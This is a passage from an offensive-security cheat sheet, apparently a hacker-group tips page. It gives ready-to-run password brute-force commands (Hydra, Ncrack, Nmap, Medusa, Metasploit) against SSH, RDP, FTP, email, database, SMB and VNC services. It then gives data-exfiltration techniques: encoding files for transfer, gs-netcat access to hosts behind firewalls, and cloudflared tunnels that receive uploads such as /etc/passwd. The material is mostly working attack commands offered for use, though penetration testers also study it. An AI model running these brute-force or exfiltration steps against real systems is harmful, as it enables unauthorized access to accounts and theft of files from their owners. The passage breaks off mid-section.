* <a href="https://nmap.org/nsedoc/categories/brute.html">Nmap BRUTE</a>
* <a href="https://sectools.org/tool/hydra/">THC Hydra</a>
* <a href="https://www.geeksforgeeks.org/password-cracking-with-medusa-in-linux/">Medusa</a> / <a href="http://foofus.net/goons/jmk/medusa/medusa.html">docs</a>
* <a href="https://docs.rapid7.com/metasploit/bruteforce-attacks/">Metasploit</a>
* <a href="https://github.com/galkan/crowbar">Crowbar</a> - great for trying all ssh keys on a target IP range.</p>
<p>Username &amp; Password lists:
* <code>/usr/share/nmap/nselib/data</code><br />
<em> <code>/usr/share/wordlists/seclists/Passwords</code>
* https://github.com/berzerk0/Probable-Wordlists - &gt;THC's FAVORITE&lt;
* https://github.com/danielmiessler/SecLists<br />
</em> https://wordlists.assetnote.io<br />
<em> https://weakpass.com<br />
</em> https://crackstation.net/  </p>
<p>Set <strong>U</strong>sername/<strong>P</strong>assword list and <strong>T</strong>arget host.
<div class="language-shell highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="nv">ULIST</span><span class="o">=</span><span class="s2">&quot;/usr/share/wordlists/brutespray/mysql/user&quot;</span>
</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a><span class="nv">PLIST</span><span class="o">=</span><span class="s2">&quot;/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt&quot;</span>
</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a><span class="nv">T</span><span class="o">=</span><span class="s2">&quot;192.168.0.1&quot;</span>
</span></code></pre></div></p>
<p>Useful <strong>Nmap</strong> parameters:
<div class="language-shell highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>--script-args<span class="w"> </span><span class="nv">userdb</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">ULIST</span><span class="si">}</span><span class="s2">&quot;</span>,passdb<span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PLIST</span><span class="si">}</span><span class="s2">&quot;</span>,brute.firstOnly
</span></code></pre></div></p>
<p>Useful <strong>Ncrack</strong> parameters:
<div class="language-shell highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>-U<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">ULIST</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>-P<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PLIST</span><span class="si">}</span><span class="s2">&quot;</span>
</span></code></pre></div></p>
<p>Useful <strong>Hydra</strong> parameters:
<div class="language-shell highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>-t4<span class="w">      </span><span class="c1"># Limit to 4 tasks</span>
</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>-l<span class="w"> </span>root<span class="w">  </span><span class="c1"># Set username</span>
</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>-V<span class="w">       </span><span class="c1"># Show each login/password attempt</span>
</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>-s<span class="w"> </span><span class="m">31337</span><span class="w"> </span><span class="c1"># Set port</span>
</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a>-S<span class="w">       </span><span class="c1"># Use SSL</span>
</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a>-f<span class="w">       </span><span class="c1"># Exit after first valid login</span>
</span></code></pre></div></p>
<!--
<div class="language-shell highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="c1">## HTTP Login</span>
</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PLIST</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>http-post-fomr<span class="w"> </span><span class="s2">&quot;/admin.php:u=^USER&amp;p-^PASS&amp;f=login:&#39;Enter&#39;&quot;</span><span class="w"> </span>-v
</span></code></pre></div>
-->
<div class="language-shell highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="c1">## SSH</span>
</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">22</span><span class="w"> </span>--script<span class="w"> </span>ssh-brute<span class="w"> </span>--script-args<span class="w"> </span>ssh-brute.timeout<span class="o">=</span>4s<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$T</span><span class="s2">&quot;</span>
</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a>ncrack<span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PLIST</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>--user<span class="w"> </span>root<span class="w"> </span><span class="s2">&quot;ssh://</span><span class="si">${</span><span class="nv">T</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a>hydra<span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PLIST</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span><span class="s2">&quot;ssh://</span><span class="nv">$T</span><span class="s2">&quot;</span>
</span></code></pre></div>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="c1">## Remote Desktop Protocol / RDP</span>
</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>ncrack<span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PLIST</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>--user<span class="w"> </span>root<span class="w"> </span>-p3389<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">T</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3" href="#__codelineno-73-3"></a>hydra<span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PLIST</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span><span class="s2">&quot;rdp://</span><span class="nv">$T</span><span class="s2">&quot;</span>
</span></code></pre></div>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a><span class="c1">## FTP</span>
</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>hydra<span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PLIST</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">&quot;</span>
</span></code></pre></div>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a><span class="c1">## IMAP (email)</span>
</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">143</span>,993<span class="w"> </span>--script<span class="w"> </span>imap-brute<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$T</span><span class="s2">&quot;</span>
</span></code></pre></div>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="c1">## POP3 (email)</span>
</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a>nmap<span class="w"> </span>-p110,995<span class="w"> </span>--script<span class="w"> </span>pop3-brute<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$T</span><span class="s2">&quot;</span>
</span></code></pre></div>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="c1">## MySQL</span>
</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a>nmap<span class="w"> </span>-p3306<span class="w"> </span>--script<span class="w"> </span>mysql-brute<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$T</span><span class="s2">&quot;</span>
</span></code></pre></div>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="c1">## PostgreSQL</span>
</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a>nmap<span class="w"> </span>-p5432<span class="w"> </span>--script<span class="w"> </span>pgsql-brute<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$T</span><span class="s2">&quot;</span>
</span></code></pre></div>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a><span class="c1">## SMB (windows)</span>
</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a>nmap<span class="w"> </span>--script<span class="w"> </span>smb-brute<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$T</span><span class="s2">&quot;</span>
</span></code></pre></div>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a><span class="c1">## Telnet</span>
</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a>nmap<span class="w"> </span>-p23<span class="w"> </span>--script<span class="w"> </span>telnet-brute<span class="w"> </span>--script-args<span class="w"> </span>telnet-brute.timeout<span class="o">=</span>8s<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$T</span><span class="s2">&quot;</span>
</span></code></pre></div>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a><span class="c1">## VNC</span>
</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a>nmap<span class="w"> </span>-p5900<span class="w"> </span>--script<span class="w"> </span>vnc-brute<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$T</span><span class="s2">&quot;</span>
</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3" href="#__codelineno-81-3"></a>ncrack<span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PLIST</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>--user<span class="w"> </span>root<span class="w"> </span><span class="s2">&quot;vnc://</span><span class="nv">$T</span><span class="s2">&quot;</span>
</span><span id="__span-81-4"><a id="__codelineno-81-4" name="__codelineno-81-4" href="#__codelineno-81-4"></a>hydra<span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PLIST</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;vnc://</span><span class="nv">$T</span><span class="s2">&quot;</span>
</span><span id="__span-81-5"><a id="__codelineno-81-5" name="__codelineno-81-5" href="#__codelineno-81-5"></a>medusa<span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PLIST</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>u<span class="w"> </span>root<span class="w"> </span>M<span class="w"> </span>vnc<span class="w"> </span>-h<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$T</span><span class="s2">&quot;</span>
</span></code></pre></div>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a><span class="c1">## VNC (with metasploit)</span>
</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a>msfconsole
</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a>use<span class="w"> </span>auxiliary/scanner/vnc/vnc_login
</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4" href="#__codelineno-82-4"></a><span class="nb">set</span><span class="w"> </span>rhosts<span class="w"> </span><span class="m">192</span>.168.0.1
</span><span id="__span-82-5"><a id="__codelineno-82-5" name="__codelineno-82-5" href="#__codelineno-82-5"></a><span class="nb">set</span><span class="w"> </span>pass_file<span class="w"> </span>/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt
</span><span id="__span-82-6"><a id="__codelineno-82-6" name="__codelineno-82-6" href="#__codelineno-82-6"></a>run
</span></code></pre></div>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a><span class="c1">## HTML basic auth</span>
</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a><span class="nb">echo</span><span class="w"> </span>admin<span class="w"> </span>&gt;user.txt<span class="w">                     </span><span class="c1"># Try only 1 username</span>
</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3" href="#__codelineno-83-3"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;blah\naaddd\nfoobar&quot;</span><span class="w"> </span>&gt;pass.txt<span class="w">  </span><span class="c1"># Add some passwords to try. &#39;aaddd&#39; is the valid one.</span>
</span><span id="__span-83-4"><a id="__codelineno-83-4" name="__codelineno-83-4" href="#__codelineno-83-4"></a>nmap<span class="w"> </span>-p80<span class="w"> </span>--script<span class="w"> </span>http-brute<span class="w"> </span>--script-args<span class="w"> </span><span class="se">\</span>
</span><span id="__span-83-5"><a id="__codelineno-83-5" name="__codelineno-83-5" href="#__codelineno-83-5"></a><span class="w">   </span>http-brute.hostname<span class="o">=</span>pentesteracademylab.appspot.com,http-brute.path<span class="o">=</span>/lab/webapp/basicauth,userdb<span class="o">=</span>user.txt,passdb<span class="o">=</span>pass.txt,http-brute.method<span class="o">=</span>POST,brute.firstOnly<span class="w"> </span><span class="se">\</span>
</span><span id="__span-83-6"><a id="__codelineno-83-6" name="__codelineno-83-6" href="#__codelineno-83-6"></a><span class="w">   </span>pentesteracademylab.appspot.com
</span></code></pre></div>
<hr />
<p><a id="exfil"></a></p>
<h2 id="4-data-uploaddownloadexfil">4. Data Upload/Download/Exfil</h2>
<p><a id="file-encoding"></a></p>
<h3 id="4i-file-encoding">4.i File Encoding</h3>
<p>Encode binaries to text for transport via a terminal connection:</p>
<h4 id="uu-encodedecode">UU encode/decode</h4>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a><span class="c1">## uuencode </span>
</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a>uuencode<span class="w"> </span>/etc/issue.net<span class="w"> </span>issue.net-COPY
</span></code></pre></div>
<details>
  <summary>Output - CLICK HERE</summary>

> begin 644 issue.net-COPY  
> 72V%L:2!'3E4O3&EN=7@@4F]L;&EN9PH\`  
> `  
> end
</details>

<div class="language-sh highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="c1">## uudecode (cut &amp; paste the 3 lines from above):</span>
</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a>uudecode
</span></code></pre></div>
<h4 id="openssl-encodedecode">Openssl encode/decode</h4>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a><span class="c1">## openssl encode</span>
</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a>openssl<span class="w"> </span>base64<span class="w"> </span>&lt;/etc/issue.net
</span></code></pre></div>
<details>
  <summary>Output - CLICK HERE</summary>

> VWJ1bnR1IDE4LjA0LjIgTFRTCg==
</details>

<div class="language-sh highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a><span class="c1">## openssl decode (cut &amp; paste the 1 line from above):</span>
</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a>openssl<span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;issue.net-COPY
</span></code></pre></div>
<h4 id="xxd-encodedecode">xxd encode/decode</h4>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a><span class="c1">## xxd encode</span>
</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a>xxd<span class="w"> </span>-p<span class="w"> </span>&lt;/etc/issue.net
</span></code></pre></div>
<details>
  <summary>Output - CLICK HERE</summary>

> 4b616c6920474e552f4c696e757820526f6c6c696e670a
</details>

<div class="language-sh highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a><span class="c1">## xxd decode</span>
</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2" href="#__codelineno-89-2"></a>xxd<span class="w"> </span>-p<span class="w"> </span>-r<span class="w"> </span>&gt;issue.net-COPY
</span></code></pre></div>
<hr />
<p><a id="cut-paste"></a></p>
<h3 id="4ii-file-transfer-using-cut-paste">4.ii. File transfer - using cut &amp; paste</h3>
<p>Paste into a file on the remote machine (note the <code>&lt;&lt;-'__EOF__'</code> to not mess with tabs or $-variables).
<div class="language-sh highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>cat<span class="w"> </span>&gt;output.txt<span class="w"> </span><span class="s">&lt;&lt;-&#39;__EOF__&#39;</span>
</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a><span class="s">[...]</span>
</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a><span class="s">__EOF__</span><span class="w">  </span><span class="c1">### Finish your cut &amp; paste by typing __EOF__</span>
</span></code></pre></div></p>
<hr />
<p><a id="file-transfer-screen"></a></p>
<h3 id="4iii-file-transfer-using-screen">4.iii. File transfer - using <em>screen</em></h3>
<h4 id="from-remote-to-local-download">From REMOTE to LOCAL (download)</h4>
<p>Have a <em>screen</em> running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output to screen-xfer.txt:</p>
<blockquote>
<p>CTRL-a : logfile screen-xfer.txt</p>
<p>CTRL-a H</p>
</blockquote>
<p>We use <em>openssl</em> to encode our data but any of the above encoding methods works. This command will display the base64 encoded data in the terminal and <em>screen</em> will write this data to <em>screen-xfer.txt</em>:</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a><span class="c1">## On the remote system encode issue.net</span>
</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2" href="#__codelineno-91-2"></a>openssl<span class="w"> </span>base64<span class="w"> </span>&lt;/etc/issue.net
</span></code></pre></div>
<p>Stop your local screen from logging any further data:</p>
<blockquote>
<p>CTRL-a H </p>
</blockquote>
<p>On your local computer decode the file:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>openssl<span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&lt;screen-xfer.txt
</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a>rm<span class="w"> </span>-rf<span class="w"> </span>screen-xfer.txt
</span></code></pre></div></p>
<h4 id="from-local-to-remote-upload">From LOCAL to REMOTE (upload)</h4>
<p>On your local system encode the data:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>openssl<span class="w"> </span>base64<span class="w"> </span>&lt;/etc/issue.net<span class="w"> </span>&gt;screen-xfer.txt
</span></code></pre></div></p>
<p>On the remote system (and from within the current <em>screen</em>):
<div class="language-sh highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>openssl<span class="w"> </span>base64<span class="w"> </span>-d
</span></code></pre></div></p>
<p>Get <em>screen</em> to slurp the base64 encoded data into screen's clipboard and paste the data from the clipboard to the remote system:</p>
<blockquote>
<p>CTRL-a : readbuf screen-xfer.txt</p>
<p>CTRL-a : paste .</p>
<p>CTRL-d</p>
<p>CTRL-d</p>
</blockquote>
<p>Note: Two CTRL-d are required due to a <a href="https://github.com/openssl/openssl/issues/9355">bug in openssl</a>.</p>
<hr />
<p><a id="file-transfer-gs-netcat"></a></p>
<h3 id="4iv-file-transfer-using-gs-netcat-and-sftp">4.iv. File transfer - using gs-netcat and sftp</h3>
<p>Use <a href="https://github.com/hackerschoice/gsocket">gs-netcat</a> and encapsulate the sftp protocol within. Allows access to hosts behind NAT/Firewall.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>gs-netcat<span class="w"> </span>-s<span class="w"> </span>MySecret<span class="w"> </span>-l<span class="w"> </span>-e<span class="w"> </span>/usr/lib/sftp-server<span class="w">         </span><span class="c1"># Host behind NAT/Firewall</span>
</span></code></pre></div>
<p>From your workstation execute this command to connect to the SFTP server:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">GSOCKET_ARGS</span><span class="o">=</span><span class="s2">&quot;-s MySecret&quot;</span><span class="w">                        </span><span class="c1"># Workstation</span>
</span><span id="__span-96-2"><a id="__codelineno-96-2" name="__codelineno-96-2" href="#__codelineno-96-2"></a>sftp<span class="w"> </span>-D<span class="w"> </span>gs-netcat<span class="w">                                        </span><span class="c1"># Workstation</span>
</span></code></pre></div></p>
<p>Or to DUMP a single file:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a><span class="c1"># On the sender</span>
</span><span id="__span-97-2"><a id="__codelineno-97-2" name="__codelineno-97-2" href="#__codelineno-97-2"></a>gs-netcat<span class="w"> </span>-l<span class="w"> </span>&lt;<span class="s2">&quot;FILENAME&quot;</span><span class="w"> </span><span class="c1"># Will output a SECRET used by the receiver</span>
</span><span id="__span-97-3"><a id="__codelineno-97-3" name="__codelineno-97-3" href="#__codelineno-97-3"></a>
</span><span id="__span-97-4"><a id="__codelineno-97-4" name="__codelineno-97-4" href="#__codelineno-97-4"></a><span class="c1"># On the receiver</span>
</span><span id="__span-97-5"><a id="__codelineno-97-5" name="__codelineno-97-5" href="#__codelineno-97-5"></a>gs-netcat<span class="w"> </span>&gt;<span class="s2">&quot;FILENAME&quot;</span><span class="w">  </span><span class="c1"># When prompted, enter the SECRET from the sender</span>
</span></code></pre></div></p>
<hr />
<p><a id="http"></a></p>
<h3 id="4v-file-transfer-using-https">4.v. File transfer - using HTTPs</h3>
<h4 id="download-from-server-to-receiver">Download from Server to Receiver:</h4>
<p>On the Sender/Server:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a><span class="c1">## Spawn a temporary HTTP server and share the current working directory.</span>
</span><span id="__span-98-2"><a id="__codelineno-98-2" name="__codelineno-98-2" href="#__codelineno-98-2"></a>python<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8080</span><span class="w"> </span>--bind<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="p">&amp;</span>
</span><span id="__span-98-3"><a id="__codelineno-98-3" name="__codelineno-98-3" href="#__codelineno-98-3"></a><span class="c1"># alternative: php -S 127.0.0.1:8080</span>
</span><span id="__span-98-4"><a id="__codelineno-98-4" name="__codelineno-98-4" href="#__codelineno-98-4"></a>cloudflared<span class="w"> </span>tunnel<span class="w"> </span>-url<span class="w"> </span>localhost:8080
</span></code></pre></div>
Receiver: Access the URL from any browser to view/download the remote file system.</p>
<h4 id="1-upload-using-php">1 - Upload using PHP:</h4>
<p>On the Receiver:
<div class="language-posh highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a><span class="nb">curl </span><span class="n">-fsSL</span> <span class="n">-o</span> <span class="n">upload_server</span><span class="p">.</span><span class="n">php</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">hackerschoice</span><span class="p">/</span><span class="n">thc-tips-tricks-hacks-cheat-sheet</span><span class="p">/</span><span class="n">raw</span><span class="p">/</span><span class="n">master</span><span class="p">/</span><span class="n">tools</span><span class="p">/</span><span class="n">upload_server</span><span class="p">.</span><span class="n">php</span>
</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a><span class="n">mkdir</span> <span class="n">upload</span>
</span><span id="__span-99-3"><a id="__codelineno-99-3" name="__codelineno-99-3" href="#__codelineno-99-3"></a><span class="p">(</span><span class="nb">cd </span><span class="n">upload</span><span class="p">;</span> <span class="n">php</span> <span class="n">-S</span> <span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">8080</span> <span class="p">../</span><span class="n">upload_server</span><span class="p">.</span><span class="n">php</span> <span class="p">&amp;&gt;/</span><span class="n">dev</span><span class="p">/</span><span class="n">null</span> <span class="p">&amp;)</span>
</span><span id="__span-99-4"><a id="__codelineno-99-4" name="__codelineno-99-4" href="#__codelineno-99-4"></a><span class="n">cloudflared</span> <span class="n">tunnel</span> <span class="p">-</span><span class="n">-url</span> <span class="n">localhost</span><span class="p">:</span><span class="n">8080</span> <span class="p">-</span><span class="n">-no-autoupdate</span>
</span></code></pre></div></p>
<p>On the Sender:
<div class="language-posh highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a><span class="c"># Set a function:</span>
</span><span id="__span-100-2"><a id="__codelineno-100-2" name="__codelineno-100-2" href="#__codelineno-100-2"></a><span class="n">up</span><span class="p">()</span> <span class="p">{</span> <span class="nb">curl </span><span class="n">-fsSL</span> <span class="o">-F</span> <span class="s2">&quot;file=@${1:?}&quot;</span> <span class="n">https</span><span class="p">://</span><span class="n">ABOVE-URL-HERE</span><span class="p">.</span><span class="n">trycloudflare</span><span class="p">.</span><span class="n">com</span><span class="p">;</span> <span class="p">}</span>
</span><span id="__span-100-3"><a id="__codelineno-100-3" name="__codelineno-100-3" href="#__codelineno-100-3"></a><span class="c"># upload files like so:</span>
</span><span id="__span-100-4"><a id="__codelineno-100-4" name="__codelineno-100-4" href="#__codelineno-100-4"></a><span class="n">up</span> <span class="n">warez</span><span class="p">.</span><span class="n">tar</span><span class="p">.</span><span class="n">gz</span>
</span><span id="__span-100-5"><a id="__codelineno-100-5" name="__codelineno-100-5" href="#__codelineno-100-5"></a><span class="n">up</span> <span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">passwd</span>
</span></code></pre></div></p>
<h4 id="2-upload-using-python">2 - Upload using PYTHON:</h4>
<p>On the Receiver:
<div class="language-posh highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a><span class="n">pip</span> <span class="n">install</span> <span class="n">uploadserver</span>
</span><span id="__span-101-2"><a id="__codelineno-101-2" name="__codelineno-101-2" href="#__codelineno-101-2"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">uploadserver</span> <span class="p">&amp;</span>
</span><span id="__span-101-3"><a id="__codelineno-101-3" name="__codelineno-101-3" href="#__codelineno-101-3"></a><span class="n">cloudflared</span> <span class="n">tunnel</span> <span class="n">-url</span> <span class="n">localhost</span><span class="p">:</span><span class="n">8000</span>
</span></code></pre></div></p>
<p>On the Sender:
